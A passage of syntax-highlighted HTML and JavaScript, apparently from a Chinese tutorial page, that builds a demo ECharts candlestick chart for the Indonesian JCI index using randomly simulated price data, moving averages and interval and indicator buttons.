                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn active"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1h"</span>&gt;</span>1小时<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1d"</span>&gt;</span>日线<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1w"</span>&gt;</span>周线<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1mo"</span>&gt;</span>月线<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info-card"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>当前价格<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"price"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"currentPrice"</span>&gt;</span>--<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"change"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"priceChange"</span>&gt;</span>-- (--%)<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stats"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-item"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-value"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"openPrice"</span>&gt;</span>--<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-label"</span>&gt;</span>开盘<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-item"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-value"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"highPrice"</span>&gt;</span>--<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-label"</span>&gt;</span>最高<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-item"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-value"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"lowPrice"</span>&gt;</span>--<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-label"</span>&gt;</span>最低<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-selector"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>技术指标<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btns"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn active"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"ma"</span>&gt;</span>MA<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"ema"</span>&gt;</span>EMA<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"macd"</span>&gt;</span>MACD<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"rsi"</span>&gt;</span>RSI<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"indicator-btn"</span> <span class="hljs-attr">data-indicator</span>=<span class="hljs-string">"boll"</span>&gt;</span>布林带<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"info-card"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>市场信息<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>印尼交易所交易时间: 09:30-12:00, 13:30-16:00 (UTC+7)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>货币: 印尼盾 (IDR)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>主要板块: 金融、资源、电信<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>数据来源: StockTV API | 本页面仅用于演示目的，不构成投资建议<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// 初始化ECharts实例</span>
        <span class="hljs-keyword">const</span> chartDom = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chart'</span>);
        <span class="hljs-keyword">const</span> myChart = echarts.<span class="hljs-title function_">init</span>(chartDom);
        
        <span class="hljs-comment">// 当前选中的时间框架和股票</span>
        <span class="hljs-keyword">let</span> currentInterval = <span class="hljs-string">'1h'</span>;
        <span class="hljs-keyword">let</span> currentStock = <span class="hljs-string">'JCI'</span>;
        <span class="hljs-keyword">let</span> currentIndicator = <span class="hljs-string">'ma'</span>;
        
        <span class="hljs-comment">// 模拟K线数据生成函数（实际应用中应从API获取）</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">generateKLineData</span>(<span class="hljs-params">interval, count = <span class="hljs-number">100</span></span>) {
            <span class="hljs-keyword">const</span> basePrice = <span class="hljs-number">7000</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1000</span>;
            <span class="hljs-keyword">const</span> data = [];
            <span class="hljs-keyword">let</span> timestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();
            
            <span class="hljs-comment">// 根据时间间隔设置时间步长（毫秒）</span>
            <span class="hljs-keyword">const</span> intervalMs = {
                <span class="hljs-string">'1m'</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'5m'</span>: <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'15m'</span>: <span class="hljs-number">15</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'30m'</span>: <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'1h'</span>: <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'1d'</span>: <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'1w'</span>: <span class="hljs-number">7</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
                <span class="hljs-string">'1mo'</span>: <span class="hljs-number">30</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>
            }[interval] || <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;
            
            <span class="hljs-comment">// 生成倒序数据（最新的数据在最后）</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = count - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
                <span class="hljs-keyword">const</span> time = timestamp - i * intervalMs;
                <span class="hljs-keyword">const</span> open = i === count - <span class="hljs-number">1</span> ? basePrice : data[data.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>];
                <span class="hljs-keyword">const</span> volatility = <span class="hljs-number">10</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">20</span>;
                <span class="hljs-keyword">const</span> change = (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() - <span class="hljs-number">0.5</span>) * volatility;
                <span class="hljs-keyword">const</span> close = open + change;
                <span class="hljs-keyword">const</span> high = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(open, close) + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * volatility / <span class="hljs-number">2</span>;
                <span class="hljs-keyword">const</span> low = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(open, close) - <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * volatility / <span class="hljs-number">2</span>;
                <span class="hljs-keyword">const</span> volume = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1000000</span>) + <span class="hljs-number">100000</span>;
                
                data.<span class="hljs-title function_">push</span>([
                    echarts.<span class="hljs-property">format</span>.<span class="hljs-title function_">formatTime</span>(<span class="hljs-string">'yyyy-MM-dd HH:mm'</span>, time),
                    open,
                    close,
                    low,
                    high,
                    volume
                ]);
            }
            
            <span class="hljs-keyword">return</span> data;
        }
        
        <span class="hljs-comment">// 计算移动平均线</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateMA</span>(<span class="hljs-params">dayCount, data</span>) {
            <span class="hljs-keyword">const</span> result = [];
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i++) {
                <span class="hljs-keyword">if</span> (i &lt; dayCount) {
                    result.<span class="hljs-title function_">push</span>(<span class="hljs-string">'-'</span>);
                    <span class="hljs-keyword">continue</span>;
                }
                <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; dayCount; j++) {
                    sum += data[i - j][<span class="hljs-number">2</span>]; <span class="hljs-comment">// 收盘价</span>
                }
                result.<span class="hljs-title function_">push</span>(+(sum / dayCount).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>));
            }
            <span class="hljs-keyword">return</span> result;
        }
        
        <span class="hljs-comment">// 更新图表</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateChart</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> klineData = <span class="hljs-title function_">generateKLineData</span>(currentInterval);
            
            <span class="hljs-comment">// 更新信息面板</span>
            <span class="hljs-keyword">const</span> latestData = klineData[klineData.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'currentPrice'</span>).<span class="hljs-property">textContent</span> = latestData[<span class="hljs-number">2</span>].<span class="hljs-title function_">toLocaleString</span>();
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'openPrice'</span>).<span class="hljs-property">textContent</span> = latestData[<span class="hljs-number">1</span>].<span class="hljs-title function_">toLocaleString</span>();
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'highPrice'</span>).<span class="hljs-property">textContent</span> = latestData[<span class="hljs-number">4</span>].<span class="hljs-title function_">toLocaleString</span>();
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'lowPrice'</span>).<span class="hljs-property">textContent</span> = latestData[<span class="hljs-number">3</span>].<span class="hljs-title function_">toLocaleString</span>();
            
            <span class="hljs-keyword">const</span> change = latestData[<span class="hljs-number">2</span>] - latestData[<span class="hljs-number">1</span>];
            <span class="hljs-keyword">const</span> changePercent = (change / latestData[<span class="hljs-number">1</span>] * <span class="hljs-number">100</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>);
            <span class="hljs-keyword">const</span> changeElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'priceChange'</span>);
            changeElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`<span class="hljs-subst">${change &gt;= <span class="hljs-number">0</span> ? <span class="hljs-string">'+'</span> : <span class="hljs-string">''</span>}</span><span class="hljs-subst">${change.toFixed(<span class="hljs-number">2</span>)}</span> (<span class="hljs-subst">${changePercent}</span>%)`</span>;
            changeElement.<span class="hljs-property">className</span> = <span class="hljs-string">`change <span class="hljs-subst">${change &gt;= <span class="hljs-number">0</span> ? <span class="hljs-string">'positive'</span> : <span class="hljs-string">'negative'</span>}</span>`</span>;
            
            <span class="hljs-comment">// 更新时间信息</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'timeInfo'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">`数据更新时间: <span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().toLocaleString()}</span>`</span>;
            
            <span class="hljs-comment">// 计算技术指标</span>
            <span class="hljs-keyword">const</span> ma5 = <span class="hljs-title function_">calculateMA</span>(<span class="hljs-number">5</span>, klineData);
            <span class="hljs-keyword">const</span> ma10 = <span class="hljs-title function_">calculateMA</span>(<span class="hljs-number">10</span>, klineData);
            <span class="hljs-keyword">const</span> ma20 = <span class="hljs-title function_">calculateMA</span>(<span class="hljs-number">20</span>, klineData);
            
            <span class="hljs-comment">// 配置图表选项</span>
            <span class="hljs-keyword">const</span> option = {
                <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span>,
                <span class="hljs-attr">animation</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-attr">legend</span>: {
                    <span class="hljs-attr">top</span>: <span class="hljs-number">10</span>,
                    <span class="hljs-attr">left</span>: <span class="hljs-string">'center'</span>,
                    <span class="hljs-attr">data</span>: [currentStock, <span class="hljs-string">'MA5'</span>, <span class="hljs-string">'MA10'</span>, <span class="hljs-string">'MA20'</span>],
                    <span class="hljs-attr">textStyle</span>: {
                        <span class="hljs-attr">color</span>: <span class="hljs-string">'#e0e0e0'</span>
                    }
                },
                <span class="hljs-attr">tooltip</span>: {
                    <span class="hljs-attr">trigger</span>: <span class="hljs-string">'axis'</span>,
                    <span class="hljs-attr">axisPointer</span>: {
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'cross'</span>
                    },
                    <span class="hljs-attr">borderWidth</span>: <span class="hljs-number">1</span>,
                    <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#2a4d7a'</span>,
                    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'rgba(16, 30, 44, 0.9)'</span>,
                    <span class="hljs-attr">textStyle</span>: {
                        <span class="hljs-attr">color</span>: <span class="hljs-string">'#e0e0e0'</span>
                    },
                    <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">params</span>) {
                        <span class="hljs-keyword">const</span> data = params[<span class="hljs-number">0</span>].<span class="hljs-property">data</span>;
                        <span class="hljs-keyword">return</span> <span class="hljs-string">`
                            &lt;div&gt;时间: <span class="hljs-subst">${data[<span class="hljs-number">0</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;开盘: <span class="hljs-subst">${data[<span class="hljs-number">1</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;收盘: <span class="hljs-subst">${data[<span class="hljs-number">2</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;最低: <span class="hljs-subst">${data[<span class="hljs-number">3</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;最高: <span class="hljs-subst">${data[<span class="hljs-number">4</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;成交量: <span class="hljs-subst">${data[<span class="hljs-number">5</span>].toLocaleString()}</span>&lt;/div&gt;
                        `</span>;
                    }
                },
                <span class="hljs-attr">grid</span>: {
                    <span class="hljs-attr">top</span>: <span class="hljs-number">80</span>,
                    <span class="hljs-attr">left</span>: <span class="hljs-number">50</span>,
                    <span class="hljs-attr">right</span>: <span class="hljs-number">50</span>,
                    <span class="hljs-attr">bottom</span>: <span class="hljs-number">80</span>
                },
                <span class="hljs-attr">xAxis</span>: {
                    <span class="hljs-attr">type</span>: <span class="hljs-string">'category'</span>,
                    <span class="hljs-attr">data</span>: klineData.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item[<span class="hljs-number">0</span>]),
                    <span class="hljs-attr">scale</span>: <span class="hljs-literal">true</span>,
                    <span class="hljs-attr">boundaryGap</span>: <span class="hljs-literal">false</span>,
                    <span class="hljs-attr">axisLine</span>: {<span class="hljs-attr">onZero</span>: <span class="hljs-literal">false</span>},
                    <span class="hljs-attr">splitLine</span>: {<span class="hljs-attr">show</span>: <span class="hljs-literal">false</span>},
                    <span class="hljs-attr">splitNumber</span>: <span class="hljs-number">20</span>,
                    <span class="hljs-attr">axisLabel</span>: {
                        <span class="hljs-attr">color</span>: <span class="hljs-string">'#90a4ae'</span>,
                        <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) {
                            <span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(value);
                            <span class="hljs-keyword">if</span> (currentInterval === <span class="hljs-string">'1d'</span> || currentInterval === <span class="hljs-string">'1w'</span> || currentInterval === <span class="hljs-string">'1mo'</span>) {
                                <span class="hljs-keyword">return</span> echarts.<span class="hljs-property">format</span>.<span class="hljs-title function_">formatTime</span>(<span class="hljs-string">'MM-dd'</span>, date);
                            } <span class="hljs-keyword">else</span> {
                                <span class="hljs-keyword">return</span> echarts.<span class="hljs-property">format</span>.<span class="hljs-title function_">formatTime</span>(<span class="hljs-string">'HH:mm'</span>, date);
                            }
                        }
                    }
                },
                <span class="hljs-attr">yAxis</span>: {
                    <span class="hljs-attr">scale</span>: <span class="hljs-literal">true</span>,
                    <span class="hljs-attr">splitArea</span>: {
                        <span class="hljs-attr">show</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">areaStyle</span>: {
                            <span class="hljs-attr">color</span>: [<span class="hljs-string">'rgba(255,255,255,0.02)'</span>, <span class="hljs-string">'rgba(0,0,0,0.02)'</span>]
                        }
                    },
                    <span class="hljs-attr">axisLabel</span>: {
                        <span class="hljs-attr">color</span>: <span class="hljs-string">'#90a4ae'</span>,
                        <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) {
                            <span class="hljs-keyword">return</span> value.<span class="hljs-title function_">toLocaleString</span>();
                        }
                    }
                },
                <span class="hljs-attr">dataZoom</span>: [
                    {
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'inside'</span>,
                        <span class="hljs-attr">start</span>: <span class="hljs-number">50</span>,
                        <span class="hljs-attr">end</span>: <span class="hljs-number">100</span>
                    },
                    {
                        <span class="hljs-attr">show</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'slider'</span>,
                        <span class="hljs-attr">top</span>: <span class="hljs-string">'90%'</span>,
                        <span class="hljs-attr">height</span>: <span class="hljs-number">40</span>,
                        <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#1a2a3a'</span>,
                        <span class="hljs-attr">textStyle</span>: {
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#90a4ae'</span>
                        },
                        <span class="hljs-attr">handleStyle</span>: {
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#2a4d7a'</span>
                        }
                    }
                ],
                <span class="hljs-attr">series</span>: [
                    {
                        <span class="hljs-attr">name</span>: currentStock,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'candlestick'</span>,
                        <span class="hljs-attr">data</span>: klineData,
                        <span class="hljs-attr">itemStyle</span>: {
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#ef5350'</span>,
                            <span class="hljs-attr">color0</span>: <span class="hljs-string">'#26a69a'</span>,
                            <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#ef5350'</span>,
                            <span class="hljs-attr">borderColor0</span>: <span class="hljs-string">'#26a69a'</span>
                        },
                        <span class="hljs-attr">markPoint</span>: {
                            <span class="hljs-attr">label</span>: {
                                <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">param</span>) {
                                    <span class="hljs-keyword">return</span> param != <span class="hljs-literal">null</span> ? <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(param.<span class="hljs-property">value</span>) : <span class="hljs-string">''</span>;
                                }
                            },
                            <span class="hljs-attr">data</span>: [
                                {
                                    <span class="hljs-attr">name</span>: <span class="hljs-string">'最高值'</span>,
                                    <span class="hljs-attr">type</span>: <span class="hljs-string">'max'</span>,
                                    <span class="hljs-attr">valueDim</span>: <span class="hljs-string">'highest'</span>
                                },
                                {
                                    <span class="hljs-attr">name</span>: <span class="hljs-string">'最低值'</span>,
                                    <span class="hljs-attr">type</span>: <span class="hljs-string">'min'</span>,
                                    <span class="hljs-attr">valueDim</span>: <span class="hljs-string">'lowest'</span>
                                }
                            ]
                        }
                    },
                    {
                        <span class="hljs-attr">name</span>: <span class="hljs-string">'MA5'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'line'</span>,
                        <span class="hljs-attr">data</span>: ma5,
                        <span class="hljs-attr">smooth</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">showSymbol</span>: <span class="hljs-literal">false</span>,
                        <span class="hljs-attr">lineStyle</span>: {
                            <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>,
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#4fc3f7'</span>
                        }
                    },
                    {
                        <span class="hljs-attr">name</span>: <span class="hljs-string">'MA10'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'line'</span>,
                        <span class="hljs-attr">data</span>: ma10,
                        <span class="hljs-attr">smooth</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">showSymbol</span>: <span class="hljs-literal">false</span>,
                        <span class="hljs-attr">lineStyle</span>: {
                            <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>,
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#fdd835'</span>
                        }
                    },
                    {
                        <span class="hljs-attr">name</span>: <span class="hljs-string">'MA20'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'line'</span>,
                        <span class="hljs-attr">data</span>: ma20,
                        <span class="hljs-attr">smooth</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">showSymbol</span>: <span class="hljs-literal">false</span>,
                        <span class="hljs-attr">lineStyle</span>: {
                            <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>,
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#ab47bc'</span>
                        }
                    },
                    {
                        <span class="hljs-attr">name</span>: <span class="hljs-string">'成交量'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'bar'</span>,
                        <span class="hljs-attr">xAxisIndex</span>: <span class="hljs-number">1</span>,
                        <span class="hljs-attr">yAxisIndex</span>: <span class="hljs-number">1</span>,
                        <span class="hljs-attr">data</span>: klineData.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item[<span class="hljs-number">5</span>]),
                        <span class="hljs-attr">itemStyle</span>: {
                            <span class="hljs-attr">color</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">params</span>) {
                                <span class="hljs-keyword">const</span> data = klineData[params.<span class="hljs-property">dataIndex</span>];
                                <span class="hljs-keyword">return</span> data[<span class="hljs-number">2</span>] &gt;= data[<span class="hljs-number">1</span>] ? <span class="hljs-string">'#26a69a'</span> : <span class="hljs-string">'#ef5350'</span>;
                            }
                        }
                    }
                ]
            };
            
            <span class="hljs-comment">// 设置图表选项</span>
            myChart.<span class="hljs-title function_">setOption</span>(option);
        }
        
        <span class="hljs-comment">// 初始化事件监听</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">initEventListeners</span>(<span class="hljs-params"/>) {
            <span class="hljs-comment">// 时间框架切换</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.interval-btn'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">btn</span> =&gt;</span> {
                btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.interval-btn'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'active'</span>));
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'active'</span>);
                    currentInterval = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-interval'</span>);
                    <span class="hljs-title function_">updateChart</span>();
                });
            });
            
            <span class="hljs-comment">// 股票选择</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'stockSelect'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'change'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                currentStock = <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
                <span class="hljs-title function_">updateChart</span>();
            });
            
            <span class="hljs-comment">// 技术指标切换</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.indicator-btn'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">btn</span> =&gt;</span> {
